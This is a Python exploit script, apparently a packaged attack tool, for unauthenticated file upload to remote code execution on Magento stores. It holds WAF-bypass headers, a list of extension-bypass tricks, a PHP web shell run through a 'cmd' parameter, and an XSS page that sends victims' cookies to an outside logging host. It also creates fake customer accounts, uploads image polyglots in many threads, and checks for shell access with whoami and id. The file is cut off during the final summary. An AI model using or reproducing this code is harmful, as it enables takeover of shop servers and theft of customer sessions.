#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Magento PolyShell Exploit - CVE NOT ASSIGNED YET
Magento Unauthenticated File Upload to RCE
March 2026 - Enhanced with Multi-Header + Custom Filename

CVE: NOT ASSIGNED YET
Severity: CRITICAL
CVSS: 9.8

BOB MARLEY LABS
VENI | VIDI | VICI
"""

import os
import sys
import base64
import urllib3
import argparse
from datetime import datetime
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from threading import Lock

# Configure UTF-8 encoding for Windows console
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except:
        pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLORS ====================
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
RST = "\033[0m"

BANNER = f"""{C}
███╗   ███╗ █████╗  ██████╗ ███████╗███╗   ██╗████████╗ ██████╗     ██████╗  ██████╗███████╗
████╗ ████║██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗    ██╔══██╗██╔════╝██╔════╝
██╔████╔██║███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║   ██║   ██║    ██████╔╝██║     █████╗  
██║╚██╔╝██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║   ██║   ██║    ██╔══██╗██║     ██╔══╝  
██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║   ╚██████╔╝    ██║  ██║╚██████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
{RST}
        {Y}Magento PolyShell{RST} | {G}Author: Bob Marley (t.me/marleyybob123){RST}
              {C}CVE: NOT ASSIGNED YET | Severity: CRITICAL{RST}
"""

# ==================== CONFIG ====================
TIMEOUT = 15
THREADS = 10

# Create timestamped output directory
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_DIR = f"PolyShell_Results_{timestamp}"

# Thread-safe printing and file writing
print_lock = Lock()
file_lock = Lock()

def safe_print(msg):
    """Thread-safe printing"""
    with print_lock:
        print(msg, flush=True)

def save_rce_result(target, rce_shells, rce_file, start_time):
    """Save RCE results for a target in SessionReaper format (grouped by target)"""
    with file_lock:
        try:
            elapsed = datetime.now() - start_time
            elapsed_str = f"{elapsed.total_seconds():.1f}s"
            
            # SessionReaper format - one entry per target with all working extensions
            with open(rce_file, 'a', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"Target: {target}\n")
                f.write(f"Working Extensions: {len(rce_shells)}\n")
                f.write(f"Time: {elapsed_str}\n")
                f.write("=" * 80 + "\n\n")
                
                # Write all working extensions for this target
                for shell_data in rce_shells:
                    f.write(f"Extension: {shell_data['extension']}\n")
                    f.write(f"Payload Type: {shell_data.get('payload_type', 'standard')}\n")
                    f.write(f"Shell URL: {shell_data['url']}\n")
                    f.write(f"Test: curl '{shell_data['url']}?cmd=whoami'\n")
                    f.write(f"Output: {shell_data.get('whoami_output', 'N/A')}\n")
                    
                    # Add ID output if available
                    if shell_data.get('id_output'):
                        f.write(f"ID Output: {shell_data.get('id_output')}\n")
                    
                    f.write("\n")
                
                f.write("\n")
                f.flush()
                
        except Exception as e:
            safe_print(f"{R}[!]{RST} Error saving result: {e}")

# ==================== UTILITIES ====================
def ensure_output_dir():
    """Create output directory if not exists"""
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

def normalize_url(url):
    """Normalize URL to include http/https"""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        return f"https://{url}"
    return url.rstrip('/')

def get_bypass_headers():
    """403/WAF bypass headers - Cloudflare, ModSecurity, AWS WAF"""
    return {
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Forwarded': 'for=127.0.0.1;by=127.0.0.1;host=127.0.0.1',
        'X-Original-URL': '/',
        'X-Rewrite-URL': '/',
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-ProxyUser-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1',
        'CF-Connecting-IP': '127.0.0.1',
        'Referer': 'https://www.google.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/json'
    }

# ==================== EXTENSIONS ====================
def get_all_extensions():
    """Get all PHP extensions (45+ from test2.py Option 4)"""
    return [
        # PRIORITY: Trailing dots (PROVEN to work!)
        '.php.', '.phar.', '.phtml.', '.php5.', '.php4.', '.php3.', '.shtml.',
        # Double trailing dots
        '.php..', '.phar..', '.phtml..',
        # Trailing spaces
        '.php ', '.phar ', '.phtml ',
        # Standard PHP extensions
        '.php', '.phar', '.php5', '.php4', '.php3', '.phtml', '.pht', '.shtml',
        # Case sensitivity bypass
        '.pHp', '.pHP5', '.phAr', '.PhAr', '.PHAR', '.Php', '.PHP', '.PhTml',
        # Null byte injection
        '.php%00.jpg', '.phar%00.txt', '.php%00.png', '.php5%00.jpg', '.phtml%00.gif',
        # Double extensions
        '.jpg.php', '.png.php', '.txt.php', '.pdf.phar', '.gif.php', '.jpeg.php5', '.txt.phtml',
        # Alternative extensions
        '.inc', '.inc.', '.module', '.pgif',
    ]

# ==================== PAYLOADS ====================
def get_rce_payload():
    """Advanced RCE payload - no placeholder"""
    return b'''<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Multiple execution methods
    if(function_exists('system')) {
        @system($cmd);
    } elseif(function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        @passthru($cmd);
    } elseif(function_exists('popen')) {
        $proc = @popen($cmd, 'r');
        while(!@feof($proc)) { echo @fread($proc, 4096); }
        @pclose($proc);
    }
}
__halt_compiler(); ?>'''

def get_xss_payload():
    """XSS payload - matches log.php parameters (cookie, url)"""
    return '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Pwned by Bob Marley</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;color:#0f0;font-family:'Courier New',monospace;text-align:center;padding:50px;}
h1{font-size:3em;margin:20px;text-shadow:0 0 10px #0f0;}
.status{color:#ff0;font-size:1.5em;margin:20px;}
.cve{color:#f00;font-weight:bold;}
.operator{color:#ff0;}
</style>
</head>
<body>
<h1>Pwned by Bob Marley</h1>
<div class="status" id="status">Initializing...</div>
<p><span class="cve">CVE:</span> Not Assigned Yet</p>

<p>Contact: t.me/marleyybob123</p>
<div id="cookie-data"></div>
<script>
document.getElementById('status').textContent='XSS Payload Executed!';
document.getElementById('status').style.color='#0f0';
var cookies=document.cookie;
var cookieDiv=document.getElementById('cookie-data');
if(cookies && cookies.length>0){
cookieDiv.innerHTML='<p style="color:#f00;margin-top:20px">Session Data: CAPTURED</p>';
var c2='http://yourlogsite.com/test/log.php';
var url=window.location.href;
var img=new Image();
img.src=c2+'?cookie='+encodeURIComponent(cookies)+'&url='+encodeURIComponent(url);
fetch(c2+'?cookie='+encodeURIComponent(cookies)+'&url='+encodeURIComponent(url),{method:'GET',mode:'no-cors'}).then(()=>{console.log('[+] Cookies sent to C2');alert('XSS EXECUTED! Cookies sent to C2. Check Telegram!');}).catch(e=>{console.log('[!] Error:',e);});
console.log('XSS EXECUTION CONFIRMED');
console.log('Cookies:',cookies);
}else{
cookieDiv.innerHTML='<p style="color:#ff0;margin-top:20px">No cookies (HttpOnly flag)</p>';
var c2='http://yourlogsite.com/test/log.php';
var url=window.location.href;
fetch(c2+'?cookie=NO_COOKIES_HTTPONLY&url='+encodeURIComponent(url),{method:'GET',mode:'no-cors'}).then(()=>{alert('XSS EXECUTED but no cookies accessible (HttpOnly)');});
}
</script>
</body>
</html>'''.encode()

def get_combined_payload():
    """Combined RCE + XSS payload"""
    return '''<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    if(function_exists('system')) { @system($_GET['cmd']); }
    elseif(function_exists('exec')) { @exec($_GET['cmd'], $o); echo implode("\n", $o); }
    elseif(function_exists('shell_exec')) { echo @shell_exec($_GET['cmd']); }
}
?><!DOCTYPE html>
<html>
<head>
<title>Pwned By Bob Marley</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;}
h1{font-size:4em;text-shadow:0 0 20px #0f0;animation:glow 2s infinite;}
@keyframes glow{0%,100%{text-shadow:0 0 20px #0f0;}50%{text-shadow:0 0 40px #0ff;}}
</style>
</head>
<body>
<h1>BOB MARLEY IS HERE</h1>
<p style="font-size:2em;color:#ffd700;">RCE + XSS Combined</p>
<p style="color:#f00;">t.me/marleyybob123</p>
<script>console.log('%cPolyShell RCE+XSS','color:#0f0;font-size:20px;');</script>
</body>
</html>'''.encode()

# ==================== RCE VALIDATION ====================
def is_valid_rce_output(output):
    """
    Validate if command output is genuine RCE (not HTML, not PHP code, not false positive)
    Returns True only for valid Unix usernames
    """
    if not output or len(output.strip()) == 0:
        return False
    
    output_lower = output.lower()
    
    # Filter out HTML responses
    html_markers = ['<html', '<!doctype', '<head>', '<body>', '<meta', 'text/html', '<div', '<script', '<style']
    if any(marker in output_lower for marker in html_markers):
        return False
    
    # Filter out PHP code
    if '<?php' in output or '<?=' in output or 'function' in output_lower[:100]:
        return False
    
    # Remove ALL possible image headers (comprehensive list)
    clean_output = output.strip()
    
    # All common image format headers
    image_headers = [
        # PNG
        b'\x89PNG\r\n\x1a\n',
        
        # GIF
        b'GIF89a',
        b'GIF87a',
        
        # JPEG/JPG (multiple variants)
        b'\xFF\xD8\xFF\xE0',  # JPEG JFIF
        b'\xFF\xD8\xFF\xE1',  # JPEG EXIF
        b'\xFF\xD8\xFF\xE2',  # JPEG with ICC profile
        b'\xFF\xD8\xFF\xE3',  # JPEG with additional data
        b'\xFF\xD8\xFF\xE8',  # JPEG SPIFF
        b'\xFF\xD8\xFF\xDB',  # JPEG raw
        b'\xFF\xD8\xFF\xEE',  # JPEG Adobe
        
        # BMP
        b'BM',
        
        # WebP
        b'RIFF',
        
        # TIFF
        b'II*\x00',  # Little-endian
        b'MM\x00*',  # Big-endian
        
        # ICO
        b'\x00\x00\x01\x00',
        
        # SVG (text-based, but can have header)
        b'<?xml',
        b'<svg',
    ]
    
    # Clean image headers from output
    try:
        output_bytes = output.encode('latin-1', errors='ignore')
        
        for header in image_headers:
            if header in output_bytes:
                output_bytes = output_bytes.replace(header, b'')
        
        clean_output = output_bytes.decode('latin-1', errors='ignore').strip()
    except:
        # If encoding fails, just use stripped output
        clean_output = output.strip()
    
    # Final strip to remove any trailing newlines/spaces
    clean_output = clean_output.strip()
    
    # Must be short (usernames are typically < 50 chars)
    if len(clean_output) > 100:
        return False
    
    # Must be single line for whoami output (allow some newlines for id command)
    if clean_output.count('\n') > 3:
        return False
    
    # Valid Unix usernames (exact match or known patterns)
    valid_usernames = {
        'root', 'www-data', 'apache', 'nginx', 'nobody', 
        'ubuntu', 'centos', 'daemon', 'http', 'httpd',
        'web', 'webuser', 'runcloud', 'forge', 'deployer'
    }
    
    clean_lower = clean_output.lower()
    
    # Check for 'id' command output format (uid=X(username) gid=Y(groupname))
    if 'uid=' in clean_lower and 'gid=' in clean_lower:
        return True
    
    # Exact match for whoami output
    if clean_lower in valid_usernames:
        return True
    
    # Pattern match (www-*, ftp*, *-fpm, etc.)
    if (clean_lower.startswith('www-') or 
        clean_lower.startswith('ftp') or
        clean_lower.endswith('-fpm') or
        'runcloud' in clean_lower):
        return True
    
    return False

# ==================== CORE EXPLOIT ====================
def deploy_polyshell(url, mode, header_type, filename, rce_file=None, start_time=None):
    """
    Deploy PolyShell with specified mode, header, and filename
    
    Args:
        url: Target URL
        mode: 'rce', 'xss', or 'both'
        header_type: 'gif', 'png', or 'all'
        filename: User-specified filename
    
    Returns:
        list of results
    """
    try:
        url = normalize_url(url)
        safe_print(f"\n{C}[*]{RST} Target: {url}")
        safe_print(f"{C}[*]{RST} Mode: {mode.upper()}")
        safe_print(f"{C}[*]{RST} Header: {header_type.upper()}")
        safe_print(f"{C}[*]{RST} Filename: {filename}")
        
        headers = get_bypass_headers()
        
        # Step 1: Get SKU
        safe_print(f"\n{Y}[1/5]{RST} Getting product SKU via GraphQL...")
        
        graphql_query = {
            "query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"
        }
        
        sku = None
        try:
            r = requests.post(f"{url}/graphql", json=graphql_query, headers=headers, timeout=TIMEOUT, verify=False)
            
            # Check if response is valid JSON
            if r.status_code != 200:
                safe_print(f"{R}[!]{RST} GraphQL returned status {r.status_code}")
                raise Exception(f"HTTP {r.status_code}")
            
            # Try to parse JSON
            try:
                data = r.json()
            except:
                safe_print(f"{R}[!]{RST} GraphQL returned invalid JSON")
                raise Exception("Invalid JSON response")
            
            if not data or 'data' not in data or data['data'] is None:
                safe_print(f"{R}[!]{RST} GraphQL returned null data")
                raise Exception("Null data response")
            
            if not data['data'].get('products') or not data['data']['products'].get('items'):
                safe_print(f"{R}[!]{RST} GraphQL returned empty products")
                raise Exception("No products found")
            
            sku = data['data']['products']['items'][0]['sku']
            safe_print(f"{G}[✓]{RST} Found SKU: {sku}")
        except Exception as e:
            safe_print(f"{R}[!]{RST} Unauthenticated GraphQL failed: {e}")
            safe_print(f"{Y}[*]{RST} Trying authenticated GraphQL...")
            
            # Try authenticated GraphQL
            try:
                import random
                import string
                random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                test_email = f"test_{random_suffix}@temp.lab"
                test_pass = f"Test!{random_suffix}"
                
                # Create account
                create_mutation = {
                    "query": f'mutation{{createCustomer(input:{{firstname:"T" lastname:"U" email:"{test_email}" password:"{test_pass}"}}){{customer{{email}}}}}}'
                }
                r_create = requests.post(f"{url}/graphql", json=create_mutation, headers=headers, timeout=TIMEOUT, verify=False)
                
                if r_create.status_code == 200 and 'errors' not in r_create.json():
                    # Generate token
                    token_mutation = {
                        "query": f'mutation{{generateCustomerToken(email:"{test_email}" password:"{test_pass}"){{token}}}}'
                    }
                    r_token = requests.post(f"{url}/graphql", json=token_mutation, headers=headers, timeout=TIMEOUT, verify=False)
                    
                    if r_token.status_code == 200:
                        try:
                            token_data = r_token.json()
                            auth_token = token_data.get('data', {}).get('generateCustomerToken', {}).get('token') if token_data else None
                        except:
                            auth_token = None
                        
                        if auth_token:
                            # Query with auth
                            auth_headers = headers.copy()
                            auth_headers['Authorization'] = f'Bearer {auth_token}'
                            r_auth = requests.post(f"{url}/graphql", json=graphql_query, headers=auth_headers, timeout=TIMEOUT, verify=False)
                            
                            if r_auth.status_code == 200:
                                try:
                                    auth_data = r_auth.json()
                                    if auth_data and auth_data.get('data') and auth_data['data'].get('products') and auth_data['data']['products'].get('items'):
                                        sku = auth_data['data']['products']['items'][0]['sku']
                                        safe_print(f"{G}[✓]{RST} Found SKU (authenticated): {sku}")
                                except:
                                    pass
                
                if not sku:
                    raise Exception("Auth GraphQL also failed")
                    
            except:
                safe_print(f"{Y}[*]{RST} Using default SKU...")
                sku = "PIE1000465"
        
        # Step 2: Create cart
        safe_print(f"{Y}[2/5]{RST} Creating guest cart via REST API...")
        
        try:
            r = requests.post(f"{url}/rest/default/V1/guest-carts", headers=headers, timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                cart_id = r.json().strip('"')
                safe_print(f"{G}[✓]{RST} Cart created: {cart_id}")
            else:
                safe_print(f"{R}[✗]{RST} Failed to create cart (Status: {r.status_code})")
                return None
        except Exception as e:
            safe_print(f"{R}[✗]{RST} Cart creation failed: {str(e)}")
            return None
        
        # Step 3: Prepare payloads based on mode
        safe_print(f"\n{Y}[3/5]{RST} Preparing attack payloads...")
        
        # Get payload content based on mode
        if mode == 'rce':
            payload_content = get_rce_payload()
            safe_print(f"{C}[*]{RST} Payload: Advanced RCE (multi-method execution)")
        elif mode == 'xss':
            payload_content = get_xss_payload()
            safe_print(f"{C}[*]{RST} Payload: Advanced XSS/HTML (matrix animation + console)")
        else:  # both
            payload_content = get_combined_payload()
            safe_print(f"{C}[*]{RST} Payload: Combined RCE + XSS")
        
        # Get extensions based on mode
        if mode == 'xss':
            extensions = ['.shtml', '.html', '.htm']
            safe_print(f"{C}[*]{RST} Extensions: {', '.join(extensions)} (HTML rendering)")
        elif mode == 'both':
            # Use ALL PHP extensions + HTML extensions for maximum coverage
            extensions = get_all_extensions() + ['.shtml', '.html', '.htm']
            safe_print(f"{C}[*]{RST} Extensions: {len(extensions)} PHP + HTML extensions")
            safe_print(f"{C}[*]{RST} Top priority: {', '.join(extensions[:10])}")
        else:  # rce
            extensions = get_all_extensions()
            safe_print(f"{C}[*]{RST} Extensions: {len(extensions)} PHP extensions")
            safe_print(f"{C}[*]{RST} Top priority: {', '.join(extensions[:10])}")
        
        # Get headers based on selection
        # IMPORTANT: PNG header needed to bypass getimagesizefromstring()
        # Server serves as text/html anyway, so JS executes fine
        if mode == 'xss':
            # XSS mode: PNG header to pass validation, server renders as HTML
            image_headers = [('PNG', b'\x89PNG\r\n\x1a\n', 'image/png')]
            safe_print(f"{C}[*]{RST} Header: PNG (bypasses validation, renders as HTML)")
        elif header_type == 'gif':
            image_headers = [('GIF89a', b'GIF89a', 'image/gif')]
            safe_print(f"{C}[*]{RST} Header: GIF89a only")
        elif header_type == 'png':
            image_headers = [('PNG', b'\x89PNG\r\n\x1a\n', 'image/png')]
            safe_print(f"{C}[*]{RST} Header: PNG only")
        else:  # all
            image_headers = [
                ('PNG', b'\x89PNG\r\n\x1a\n', 'image/png'),
                ('GIF89a', b'GIF89a', 'image/gif'),
                ('GIF87a', b'GIF87a', 'image/gif'),
                ('JPEG', b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00', 'image/jpeg'),
            ]
            safe_print(f"{C}[*]{RST} Headers: PNG, GIF89a, GIF87a, JPEG")
        
        # Step 4: Upload payloads
        safe_print(f"\n{Y}[4/5]{RST} Uploading payloads with {THREADS} threads...")
        
        # Build upload tasks
        upload_tasks = []
        for header_name, header_bytes, mime_type in image_headers:
            for ext in extensions:
                # Create UNIQUE filename per header type to avoid overwriting
                # Format: filename_HEADER_ext (e.g., bobishere_PNG.php, bobishere_GIF89a.php)
                base_name = filename.replace(ext, '') if filename.endswith(ext) else filename
                full_filename = f"{base_name}_{header_name}{ext}"
                
                # Create polyglot
                polyglot = header_bytes + payload_content
                
                upload_tasks.append({
                    'filename': full_filename,
                    'content': polyglot,
                    'mime': mime_type,
                    'header': header_name,
                    'extension': ext
                })
        
        safe_print(f"{C}[*]{RST} Total uploads: {len(upload_tasks)}")
        
        uploaded_shells = []
        
        # Upload in parallel
        def upload_single(task):
            try:
                file_base64 = base64.b64encode(task['content']).decode()
                
                cart_item_payload = {
                    "cart_item": {
                        "qty": 1,
                        "sku": sku,
                        "product_option": {
                            "extension_attributes": {
                                "custom_options": [{
                                    "option_id": str(50000 + upload_tasks.index(task)),
                                    "option_value": "file",
                                    "extension_attributes": {
                                        "file_info": {
                                            "base64_encoded_data": file_base64,
                                            "name": task['filename'],
                                            "type": task['mime']
                                        }
                                    }
                                }]
                            }
                        }
                    }
                }
                
                r = requests.post(
                    f"{url}/rest/default/V1/guest-carts/{cart_id}/items",
                    json=cart_item_payload,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False
                )
                
                if r.status_code in [200, 400]:
                    safe_print(f"{G}[✓]{RST} {task['header']} + {task['extension']} → {task['filename']}")
                    return task
                else:
                    safe_print(f"{R}[✗]{RST} {task['header']} + {task['extension']} → Failed ({r.status_code})")
                    return None
                    
            except Exception as e:
                safe_print(f"{R}[✗]{RST} {task['filename']} → Error: {str(e)[:50]}")
                return None
        
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(upload_single, task) for task in upload_tasks]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    uploaded_shells.append(result)
        
        if not uploaded_shells:
            safe_print(f"\n{R}[!]{RST} No shells uploaded successfully")
            return None
        
        safe_print(f"\n{G}[+]{RST} Uploaded {len(uploaded_shells)}/{len(upload_tasks)} payload(s)")
        
        # Step 5: Test accessibility and execution
        safe_print(f"\n{Y}[5/5]{RST} Testing shell accessibility and execution...\n")
        
        storage_type = "unknown"
        server_info = {}
        results = []
        working_shells = []
        accessible_shells = []
        
        # Test sequentially with rate limit handling
        import time
        
        for shell in uploaded_shells:
            shell_filename = shell['filename']
            shell_type = shell['header']
            shell_ext = shell['extension']
            
            # Calculate path based on filename
            first_char = shell_filename[0].lower()
            second_char = shell_filename[1].lower()
            
            # Try both with and without /pub prefix
            shell_paths = [
                f"{url}/media/custom_options/quote/{first_char}/{second_char}/{shell_filename}",
                f"{url}/pub/media/custom_options/quote/{first_char}/{second_char}/{shell_filename}",
            ]
            
            safe_print(f"{C}[TEST]{RST} {shell_filename} ({shell_type})")
            
            # Small delay to avoid rate limiting (0.1s = 10 files/second)
            time.sleep(0.1)
            
            for shell_url in shell_paths:
                try:
                    # Test accessibility
                    test_r = requests.get(shell_url, headers=headers, timeout=10, verify=False)
                    
                    if test_r.status_code != 200:
                        safe_print(f"{R}[!]{RST} Not accessible (Status: {test_r.status_code})")
                        continue
                    
                    if test_r.status_code == 200:
                        # SERVER FINGERPRINTING (only once)
                        if storage_type == "unknown":
                            response_headers = test_r.headers
                            
                            if 'x-amz-server-side-encryption' in response_headers or 'x-amz-meta-' in str(response_headers).lower():
                                storage_type = "AWS S3"
                                server_info = {'type': 'S3', 'rce_probability': 'VERY LOW (static storage)'}
                                safe_print(f"{Y}[FINGERPRINT]{RST} Storage: AWS S3 (RCE unlikely)")
                            elif 'x-goog-' in str(response_headers).lower():
                                storage_type = "Google Cloud Storage"
                                server_info = {'type': 'GCS', 'rce_probability': 'VERY LOW (static storage)'}
                                safe_print(f"{Y}[FINGERPRINT]{RST} Storage: Google Cloud (RCE unlikely)")
                            elif 'server' in response_headers:
                                server_header = response_headers.get('server', '').lower()
                                if 'nginx' in server_header:
                                    storage_type = "Nginx (Local)"
                                    server_info = {'type': 'Nginx', 'rce_probability': 'HIGH (if misconfigured)'}
                                    safe_print(f"{G}[FINGERPRINT]{RST} Server: Nginx (HIGH RCE potential!)")
                                elif 'apache' in server_header:
                                    storage_type = "Apache (Local)"
                                    server_info = {'type': 'Apache', 'rce_probability': 'MEDIUM (.htaccess may block)'}
                                    safe_print(f"{Y}[FINGERPRINT]{RST} Server: Apache (.htaccess protection)")
                        
                        # For RCE mode: Skip payload content check and directly test execution
                        if mode == 'rce':
                            safe_print(f"{Y}[+]{RST} Accessible: {shell_url}")
                            safe_print(f"{Y}[*]{RST} Testing RCE with whoami...")
                            
                            try:
                                # Test with whoami command
                                cmd_test = requests.get(f"{shell_url}?cmd=whoami", headers=headers, timeout=10, verify=False)
                                output = cmd_test.text.strip()
                                
                                # Validate RCE output
                                is_rce = is_valid_rce_output(output)
                                
                                if is_rce:
                                    safe_print(f"{G}[!!!]{RST} RCE CONFIRMED!")
                                    safe_print(f"{G}[+]{RST} whoami output: {output[:100]}")
                                    
                                    # Verify with id command
                                    id_test = requests.get(f"{shell_url}?cmd=id", headers=headers, timeout=10, verify=False)
                                    id_output = id_test.text.strip()
                                    if 'uid=' in id_output or 'gid=' in id_output:
                                        safe_print(f"{G}[+]{RST} id output: {id_output[:100]}")
                                    
                                    shell_data = {
                                        'filename': shell_filename,
                                        'url': shell_url,
                                        'header': shell_type,
                                        'extension': shell_ext,
                                        'status': 'RCE',
                                        'payload_type': 'advanced',
                                        'usage': f"{shell_url}?cmd=whoami",
                                        'whoami_output': output[:200],
                                        'id_output': id_output[:200] if ('uid=' in id_output or 'gid=' in id_output) else None
                                    }
                                    
                                    results.append(shell_data)
                                    working_shells.append(shell_url)
                                else:
                                    safe_print(f"{Y}[*]{RST} Not executing (protected by {storage_type})")
                                    results.append({
                                        'filename': shell_filename,
                                        'url': shell_url,
                                        'header': shell_type,
                                        'extension': shell_ext,
                                        'status': 'ACCESSIBLE'
                                    })
                                    accessible_shells.append(shell_url)
                            except Exception as e:
                                safe_print(f"{Y}[*]{RST} RCE test failed: {str(e)[:50]}")
                        
                        elif mode == 'xss':
                            # Verify payload content for XSS mode
                            is_our_payload = b'SYSTEM COMPROMISED' in test_r.content or b'Bob Marley' in test_r.content or b'<?php' in test_r.content
                            
                            if not is_our_payload:
                                safe_print(f"{R}[!]{RST} File found but payload not verified (wrong content)")
                                continue
                            
                            safe_print(f"{Y}[+]{RST} Accessible: {shell_url}")
                            
                            # Test HTML rendering only
                            content_type = test_r.headers.get('Content-Type', 'N/A')
                            if 'text/html' in content_type.lower():
                                safe_print(f"{G}[!!!]{RST} HTML WILL RENDER!")
                                results.append({
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'header': shell_type,
                                    'extension': shell_ext,
                                    'status': 'HTML_RENDERS',
                                    'content_type': content_type
                                })
                            else:
                                safe_print(f"{Y}[*]{RST} Source visible only")
                                results.append({
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'header': shell_type,
                                    'extension': shell_ext,
                                    'status': 'ACCESSIBLE',
                                    'content_type': content_type
                                })
                        
                        else:  # both
                            # Verify payload content for BOTH mode
                            is_our_payload = b'BOB MARLEY IS HERE' in test_r.content or b'<?php' in test_r.content
                            
                            if not is_our_payload:
                                safe_print(f"{R}[!]{RST} File found but payload not verified (wrong content)")
                                continue
                            
                            safe_print(f"{Y}[+]{RST} Accessible: {shell_url}")
                            
                            # Test BOTH RCE and HTML rendering
                            rce_works = False
                            html_works = False
                            
                            # Test RCE with whoami
                            safe_print(f"{Y}[*]{RST} Testing RCE...")
                            try:
                                cmd_test = requests.get(f"{shell_url}?cmd=whoami", headers=headers, timeout=10, verify=False)
                                output = cmd_test.text.strip()
                                
                                # Validate RCE output
                                is_rce = is_valid_rce_output(output)
                                
                                if is_rce:
                                    safe_print(f"{G}[!!!]{RST} RCE CONFIRMED!")
                                    safe_print(f"{G}[+]{RST} Output: {output[:100]}")
                                    rce_works = True
                                    
                                    # Get id output too
                                    try:
                                        id_test = requests.get(f"{shell_url}?cmd=id", headers=headers, timeout=10, verify=False)
                                        whoami_output = output
                                        id_output = id_test.text.strip()
                                    except:
                                        whoami_output = output
                                        id_output = None
                                else:
                                    safe_print(f"{Y}[*]{RST} RCE not executing")
                            except Exception as e:
                                safe_print(f"{Y}[*]{RST} RCE test failed: {str(e)[:50]}")
                            
                            # Test HTML rendering
                            safe_print(f"{Y}[*]{RST} Testing HTML rendering...")
                            content_type = test_r.headers.get('Content-Type', 'N/A')
                            if 'text/html' in content_type.lower():
                                safe_print(f"{G}[!!!]{RST} HTML WILL RENDER!")
                                html_works = True
                            else:
                                safe_print(f"{Y}[*]{RST} Source visible only")
                            
                            # Store result based on what works
                            if rce_works and html_works:
                                shell_data = {
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'header': shell_type,
                                    'extension': shell_ext,
                                    'status': 'RCE+HTML',
                                    'payload_type': 'combined',
                                    'usage': f"{shell_url}?cmd=whoami",
                                    'whoami_output': whoami_output[:200] if rce_works else None,
                                    'id_output': id_output[:200] if rce_works and id_output else None
                                }
                                results.append(shell_data)
                                working_shells.append(shell_url)
                                    
                            elif rce_works:
                                shell_data = {
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'header': shell_type,
                                    'extension': shell_ext,
                                    'status': 'RCE',
                                    'payload_type': 'advanced',
                                    'whoami_output': whoami_output[:200] if rce_works else None,
                                    'id_output': id_output[:200] if rce_works and id_output else None,
                                    'usage': f"{shell_url}?cmd=whoami"
                                }
                                results.append(shell_data)
                                working_shells.append(shell_url)
                                    
                            elif html_works:
                                results.append({
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'header': shell_type,
                                    'extension': shell_ext,
                                    'status': 'HTML_RENDERS',
                                    'content_type': content_type
                                })
                            else:
                                results.append({
                                    'filename': shell_filename,
                                    'url': shell_url,
                                    'status': 'ACCESSIBLE'
                                })
                                accessible_shells.append(shell_url)
                        
                        break  # Stop trying other paths if found
                        
                except requests.exceptions.RequestException as e:
                    safe_print(f"{R}[!]{RST} Request failed: {str(e)[:50]}")
                    continue
                except Exception as e:
                    safe_print(f"{R}[!]{RST} Error: {str(e)[:50]}")
                    continue
            
            safe_print("")  # Empty line between tests
        
        # Summary
        safe_print(f"\n{'='*70}")
        safe_print(f"{C}POLYSHELL ATTACK SUMMARY{RST}")
        safe_print(f"{'='*70}")
        
        if server_info:
            safe_print(f"\n{C}[SERVER FINGERPRINT]{RST}")
            safe_print(f"{Y}[*]{RST} Storage Type: {storage_type}")
            safe_print(f"{Y}[*]{RST} RCE Probability: {server_info.get('rce_probability', 'Unknown')}")
        
        if results:
            rce_shells = [r for r in results if r['status'] in ['RCE', 'RCE+HTML']]
            html_shells = [r for r in results if r['status'] in ['HTML_RENDERS', 'RCE+HTML']]
            both_shells = [r for r in results if r['status'] == 'RCE+HTML']
            accessible = [r for r in results if r['status'] == 'ACCESSIBLE']
            
            if both_shells:
